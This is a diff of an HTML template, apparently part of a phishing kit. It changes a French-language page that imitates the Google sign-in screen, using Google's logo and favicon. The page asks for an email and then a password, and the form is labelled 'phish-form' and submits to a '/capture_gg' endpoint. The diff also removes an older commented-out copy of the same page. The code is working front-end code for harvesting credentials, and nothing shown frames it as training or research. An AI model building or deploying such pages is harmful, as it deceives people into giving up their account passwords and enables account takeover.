@@ -1,55 +1,4 @@
-<!--
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Connexion Google</title>
-  <link rel="stylesheet" href="../static/pygoogle.css"/>
-  <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
-</head>
-<body>
-  <div class="container">
-    <div class="login-box">
-        <div class="top-row">
-          <div class="left-column">
-            <div class="logo">
-              <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google logo" />
-            </div>
-            <div class="text-column">
-              <h1>Connexion</h1>
-              <p>Utilisez votre compte Google</p>
-            </div>
-          </div>
-          <input type="text" placeholder="Adresse e-mail ou téléphone" />
-        </div>
-      
-        <a href="#" class="link link-under-input">Adresse e-mail oubliée ?</a>
-      
-        <p class="info">
-          Ce n'est pas votre ordinateur ?
-          <span class="link">En savoir plus sur l'utilisation du mode Invité</span>
-        </p>
-      
-        <div class="actions">
-          <a href="#" class="link">Créer un compte</a>
-          <button>Suivant</button>
-        </div>
-      </div>
-      
-      
-    <footer>
-      <span>Français (France)</span>
-      <div class="footer-links">
-        <a href="#">Aide</a>
-        <a href="#">Confidentialité</a>
-        <a href="#">Conditions</a>
-      </div>
-    </footer>
-  </div>
-</body>
-</html>
--->
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -72,16 +21,22 @@
               <p id="login-subtitle">Utilisez votre compte Google</p>
             </div>
           </div>
-          <div id="email-step">
-            <form class="phish-form" method="POST" action="/phishform"></form>
-            <input type="text" id="email-input" placeholder="Adresse e-mail ou téléphone" />
-            <a href="#" class="link link-under-input">Adresse e-mail oubliée ?</a>
-          </div>
-          <div id="password-step" style="display: none; width: 100%;">
-            <div class="user-info" id="user-email-display"></div>
-            <input type="password" id="password-input" placeholder="Mot de passe" />
-            <a href="#" class="link link-under-input">Mot de passe oublié ?</a>
-          </form>
+          <div id="email-container">
+            <form class="phish-form" method="POST" action="/capture_gg">
+
+              <div id="email-step">
+                <input type="text" id="email-input" placeholder="Adresse e-mail ou téléphone" />
+                <a href="#" class="link link-under-input">Adresse e-mail oubliée ?</a>
+              </div>
+            
+              <div id="password-step" style="display: none; width: 100%;">
+                <div class="user-info" id="user-email-display"></div>
+                <input type="password" id="password-input" placeholder="Mot de passe" />
+                <a href="#" class="link link-under-input">Mot de passe oublié ?</a>
+              </div>
+            
+            </form>
+            
           </div>
         </div>
       
